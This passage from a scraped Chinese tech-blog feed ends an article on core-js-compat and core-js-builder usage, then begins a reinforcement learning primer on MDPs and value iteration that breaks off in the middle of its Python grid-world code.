<p>compat会根据我们设置的浏览器兼容性配置，输出特性列表，包含两个字段：list是一个特性名称列表；targets是一个Map结构，key为特性名，值为可以兼容的浏览器。假设我们把上面的 targets改成 &gt; 50%，此时会输出空值：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 50%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* 输出结果
{ list: [], targets: {} }
*/</span>
</code></pre>
<p>我们增加exclude，排除部分属性，可以看到特性数量大大减少：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 10%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">exclude</span>: [<span class="hljs-string">"esnext"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* 输出结果
{
  list: [
    'es.iterator.concat',
    'es.math.sum-precise',
    'es.async-iterator.async-dispose',
    'web.dom-exception.stack',
    'web.immediate',
    'web.structured-clone'
  ],
  targets: {
    'es.iterator.concat': { 'chrome-android': '143' },
    'es.math.sum-precise': { 'chrome-android': '143' },
    'es.async-iterator.async-dispose': { 'chrome-android': '143' },
    'web.dom-exception.stack': { 'chrome-android': '143' },
    'web.immediate': { 'chrome-android': '143' },
    'web.structured-clone': { 'chrome-android': '143' }
  }
}
*/</span>
</code></pre>
<p>再试一下inverse的效果：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 10%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
  <span class="hljs-attr">inverse</span>: <span class="hljs-literal">true</span>
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* 输出结果
{
  list: [
    'es.symbol',
    'es.symbol.description',
    ...其它特性
  ],
  targets: {
    'es.symbol': {},
    'es.symbol.description': {},
    ...其它特性
  }
}
*/</span>
</code></pre>
<p>因为输出的是不需要引入core-js兼容的特性，所以特性数量非常多，而且targets中没有列出支持的浏览器版本。</p>
<h3 data-id="heading-24">core-js-builder</h3>
<p>前面介绍的core-js-compat是接收参数之后，输出core-js的特性列表数组。而core-js-builder接收类似的参数，直接输出引用core-js的代码。我们首先列举一下参数：</p>
<ul>
<li>targets: Browserslist格式的浏览器兼容配置</li>
<li>modules: 需要设置兼容性配置的模块，可以是core-js/full，也可以是某个特性，甚至是正则</li>
<li>exclude: 需要排除的模块</li>
<li>format: 'bundle'输出打包后的源码；'cjs'和'esm'输出对应格式的引用代码</li>
<li>filename: 输出的文件名</li>
</ul>
<p>我们先试一下例子。首先是format格式的：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> builder = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-builder"</span>);
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">funJzplp</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">builder</span>({
    <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 30%"</span>,
    <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
    <span class="hljs-attr">format</span>: <span class="hljs-string">'bundle'</span>,
  });
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
}
<span class="hljs-title function_">funJzplp</span>();

<span class="hljs-comment">/* 输出结果
...代码很长，这里节选部分
 (function(module, exports, __webpack_require__) {
"use strict";
var NATIVE_BIND = __webpack_require__(8);
var FunctionPrototype = Function.prototype;
*/</span>
</code></pre>
<p>可以看到，builder函数输出了非常长的代码，内容实际为输出的特性经过打包之后的结果代码。再试一下'cjs'和'esm'，输出的是对应木块的引用代码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// format: 'cjs' 输出结果</span>
...代码很长，这里节选部分
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/modules/es.iterator.concat'</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/modules/es.math.sum-precise'</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/modules/es.async-iterator.async-dispose'</span>);
*/

<span class="hljs-comment">// format: 'esm' 输出结果</span>
...代码很长，这里节选部分
<span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/modules/es.iterator.concat.js'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/modules/es.math.sum-precise.js'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/modules/es.async-iterator.async-dispose.js'</span>;
*/
</code></pre>
<p>如果设置了filename，core-js-builder会创建该名称的文件，并将代码写入到文件中。</p>
<h2 data-id="heading-25">总结</h2>
<p>这篇文章描述了core-js相关包的代码内容和使用方式。core-js实际上就是提供了JavaScript中一些API特性的兼容实现方式。它与实现语法兼容的Babel一起，可以做到大部分JavaScript的兼容性。当然core-js和Babel也不是万能的，它们都有各自无法转义和兼容的语法和特性。</p>
<p>core-js这个包名字起的非常好，一听就是JavaScript的“核心”包。由于它实现了很多API特性，而且引用数量非常非常大，因此叫“核心”也不为过。虽然这个包引用量很大，但不如React/Vue或者一些其它包出名。因为这个包是处理的更底层的兼容性有问题，因此用户感知不强。core-js包的作者还因为没有钱而遇到很多问题，这个包并没有让他变的富有。</p>
<h2 data-id="heading-26">参考</h2>
<ul>
<li>core-js 文档<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fcore-js.io%2F" target="_blank" title="https://core-js.io/" ref="nofollow noopener noreferrer">core-js.io/</a></li>
<li>Github core-js<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js" target="_blank" title="https://github.com/zloirock/core-js" ref="nofollow noopener noreferrer">github.com/zloirock/co…</a></li>
<li>解锁Babel核心功能：从转义语法到插件开发<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fjzplp.github.io%2F2025%2Fbabel-intro.html" target="_blank" title="https://jzplp.github.io/2025/babel-intro.html" ref="nofollow noopener noreferrer">jzplp.github.io/2025/babel-…</a></li>
<li>@babel/preset-env 文档<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fbabeljs.io%2Fdocs%2Fbabel-preset-env" target="_blank" title="https://babeljs.io/docs/babel-preset-env" ref="nofollow noopener noreferrer">babeljs.io/docs/babel-…</a></li>
<li>@babel/polyfill 文档<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fbabeljs.io%2Fdocs%2Fbabel-polyfill" target="_blank" title="https://babeljs.io/docs/babel-polyfill" ref="nofollow noopener noreferrer">babeljs.io/docs/babel-…</a></li>
<li>@babel/runtime 文档<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fbabeljs.io%2Fdocs%2Fbabel-runtime" target="_blank" title="https://babeljs.io/docs/babel-runtime" ref="nofollow noopener noreferrer">babeljs.io/docs/babel-…</a></li>
<li>Github regenerator-runtime<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffacebook%2Fregenerator%2Ftree%2Fmain%2Fpackages%2Fruntime" target="_blank" title="https://github.com/facebook/regenerator/tree/main/packages/runtime" ref="nofollow noopener noreferrer">github.com/facebook/re…</a></li>
<li>Github core-js-compat<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js%2Fblob%2Fmaster%2Fpackages%2Fcore-js-compat" target="_blank" title="https://github.com/zloirock/core-js/blob/master/packages/core-js-compat" ref="nofollow noopener noreferrer">github.com/zloirock/co…</a></li>
<li>Github core-js-builder<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js%2Ftree%2Fmaster%2Fpackages%2Fcore-js-builder" target="_blank" title="https://github.com/zloirock/core-js/tree/master/packages/core-js-builder" ref="nofollow noopener noreferrer">github.com/zloirock/co…</a></li>
<li>So, what's next?<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzloirock%2Fcore-js%2Fblob%2Fmaster%2Fdocs%2F2023-02-14-so-whats-next.md" target="_blank" title="https://github.com/zloirock/core-js/blob/master/docs/2023-02-14-so-whats-next.md" ref="nofollow noopener noreferrer">github.com/zloirock/co…</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[万字长文！搞懂强化学习的基础知识！]]></title>    <link>https://juejin.cn/post/7597058147750150154</link>    <guid>https://juejin.cn/post/7597058147750150154</guid>    <pubDate>2026-01-20T16:00:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597058147750150154" data-draft-id="7597058147750117386" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="万字长文！搞懂强化学习的基础知识！"/> <meta itemprop="keywords" content="面试"/> <meta itemprop="datePublished" content="2026-01-20T16:00:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aicoting"/> <meta itemprop="url" content="https://juejin.cn/user/933911964427818"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            万字长文！搞懂强化学习的基础知识！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/933911964427818/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aicoting
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T16:00:15.000Z" title="Tue Jan 20 2026 16:00:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>推荐直接网站在线阅读：<a href="https://link.juejin.cn?target=https%3A%2F%2Faicoting.cn%2F" target="_blank" title="https://aicoting.cn/" ref="nofollow noopener noreferrer">aicoting.cn</a></p>
<h3 data-id="heading-0">强化学习是什么？</h3>
<p>强化学习（Reinforcement Learning, RL）是一类通过与环境交互来学习最优决策策略的机器学习方法。与监督学习不同，强化学习没有直接提供的“正确答案”，而是通过奖励信号（reward）来评估行为的好坏。智能体（agent）在环境（environment）中执行动作（action），根据环境反馈获得奖励，并观察状态（state）变化。</p>
<p>强化学习的目标是学习一个策略，使得智能体在长期交互中获得累计奖励最大化。典型方法包括基于值函数的策略（如 Q-learning、SARSA）、基于策略优化的方法（如 Policy Gradient）、以及结合深度神经网络的深度强化学习（Deep RL）。如今，强化学习已经在机器人控制、游戏智能、资源调度和自动驾驶等领域逐步铺开。</p>
<h3 data-id="heading-1">马尔可夫决策过程</h3>
<p>马尔可夫决策过程（MDP）是强化学习和决策理论中的核心数学框架，用于描述具有随机性和序列决策特征的环境。MDP 假设环境的状态随时间变化，并且未来状态的转移只依赖于当前状态和智能体的行为，而与过去状态无关，这就是经典的“马尔可夫性”假设。</p>
<p>马尔可夫决策过程（MDP）是一个四元组<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>S</mi><mo separator="true">,</mo><mi>A</mi><mo separator="true">,</mo><mi>P</mi><mo separator="true">,</mo><mi>R</mi><mo separator="true">,</mo><mi>γ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(S,A,P,R,γ)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="mclose">)</span></span></span></span></span>，其中：</p>
<ol>
<li>状态空间 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span>：表示环境可能处于的所有状态集合，每个状态 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>∈</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">s∈S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"/><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span> 描述了环境在某一时刻的情况。</li>
<li>动作空间 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span>：表示智能体在每个状态下可选择的所有动作集合，动作决定智能体对环境的干预。</li>
<li>状态转移概率 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>s</mi><mtext>′</mtext><mi mathvariant="normal">∣</mi><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(s′|s,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mord">′∣</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span></span></span></span></span>：描述在状态 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span></span></span></span></span>采取动作 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">a</span></span></span></span></span>后转移到状态 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mtext>′</mtext></mrow><annotation encoding="application/x-tex">s′</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5556em;"/><span class="mord mathnormal">s</span><span class="mord">′</span></span></span></span></span>的概率分布，用于建模环境的随机性。</li>
<li>奖励函数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo separator="true">,</mo><mi>s</mi><mtext>′</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">R(s,a,s′)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">s</span><span class="mord">′</span><span class="mclose">)</span></span></span></span></span>：表示智能体在状态 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span></span></span></span></span>执行动作 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">a</span></span></span></span></span>并转移到状态 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mtext>′</mtext></mrow><annotation encoding="application/x-tex">s′</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5556em;"/><span class="mord mathnormal">s</span><span class="mord">′</span></span></span></span></span>时获得的即时反馈，指导智能体选择更优策略。</li>
<li>折扣因子 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>γ</mi><mo>∈</mo><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">γ∈[0,1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">]</span></span></span></span></span>：用于计算累计奖励的折扣，使得智能体在做决策时平衡短期奖励和长期收益。</li>
</ol>
<p>MDP 的核心问题是找到一个最优策略 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>π</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\pi^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6887em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span></span>，使智能体在环境中采取策略后获得的 期望累计奖励最大化。策略<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>π</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex"> π(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span></span></span></span>定义了在每个状态下选择动作的规则。</p>
<p>解决 MDP 的常用方法包括：</p>
<ol>
<li>动态规划（Dynamic Programming, DP）</li>
</ol>
<p>通过贝尔曼方程（Bellman Equation）迭代求解状态值函数 V(s) 或动作值函数 Q(s,a)，逐步更新策略，直至收敛到最优策略。</p>
<ol start="2">
<li>值迭代（Value Iteration）与策略迭代（Policy Iteration）</li>
</ol>
<ul>
<li>值迭代直接迭代更新值函数，最终根据值函数导出最优策略。</li>
<li>策略迭代交替进行策略评估和策略改进，直到策略不再改变，得到最优策略。</li>
</ul>
<ol start="3">
<li>强化学习方法</li>
</ol>
<p>当环境的状态转移概率和奖励函数未知时，可通过交互式学习方法（如 Q-learning、SARSA）估计值函数，逐步逼近最优策略。</p>
<p>下面我们通过代码演示如何在一个小型 MDP 上使用 值迭代（Value Iteration） 求解最优策略，为了直观展示，我用一个简单的网格世界（Grid World）环境：</p>
<pre><code class="hljs language-ini" lang="ini">import numpy as np
import matplotlib.pyplot as plt

<span class="hljs-comment"># 1. 网格世界参数</span>
n_rows, <span class="hljs-attr">n_cols</span> = <span class="hljs-number">4</span>, <span class="hljs-number">4</span>
<span class="hljs-attr">n_states</span> = n_rows * n_cols
<span class="hljs-attr">n_actions</span> = <span class="hljs-number">4</span>  <span class="hljs-comment"># 上,下,左,右</span>

<span class="hljs-attr">action_offsets</span> = [(-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>),(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)]
<span class="hljs-attr">action_symbols</span> = [<span class="hljs-string">'↑'</span>,<span class="hljs-string">'↓'</span>,<span class="hljs-string">'←'</span>,<span class="hljs-string">'→'</span>]

<span class="hljs-attr">start_state</span> = <span class="hljs-number">0</span>       <span class="hljs-comment"># 左上角 S</span>
<span class="hljs-attr">terminal_state</span> = n_states - <span class="hljs-number">1</span>  <span class="hljs-comment"># 右下角 T</span>
<span class="hljs-attr">reward_step</span> = -<span class="hljs-number">1</span>
<span class="hljs-attr">reward_terminal</span> = <span class="hljs-number">0</span>

<span class="hljs-comment"># 状态转移函数</span>
def next_state_reward(s, a):
    row, <span class="hljs-attr">col</span> = divmod(s, n_cols)
    if <span class="hljs-attr">s</span> == terminal_state:
        return s, reward_terminal
    dr, <span class="hljs-attr">dc</span> = action_<span class="hljs-literal">off</span>sets[a]
    <span class="hljs-attr">new_row</span> = min(max(row+dr,<span class="hljs-number">0</span>), n_rows-<span class="hljs-number">1</span>)
    <span class="hljs-attr">new_col</span> = min(max(col+dc,<span class="hljs-number">0</span>), n_cols-<span class="hljs-number">1</span>)
    <span class="hljs-attr">s_next</span> = new_row * n_cols + new_col
    return s_next, reward_step

<span class="hljs-comment"># 2. 值迭代</span>
